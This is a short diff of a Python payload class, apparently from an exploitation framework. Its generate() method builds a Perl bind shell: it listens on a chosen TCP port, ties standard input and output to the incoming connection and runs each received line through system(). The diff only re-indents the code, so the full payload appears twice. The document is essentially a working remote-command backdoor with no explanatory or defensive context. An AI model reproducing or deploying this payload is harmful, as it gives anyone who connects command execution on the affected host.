@@ -21,9 +21,9 @@ class Payload(BindTCPPayloadMixin, GenericPayload):
 
     def generate(self):
         return (
-            "use IO;foreach my $key(keys %ENV){" +
-            "if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort," +
-            str(self.rport) +
-            ",Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){" +
-            "if($_=~ /(.*)/){system $1;}};"
+                "use IO;foreach my $key(keys %ENV){" +
+                "if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort," +
+                str(self.rport) +
+                ",Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){" +
+                "if($_=~ /(.*)/){system $1;}};"
         )
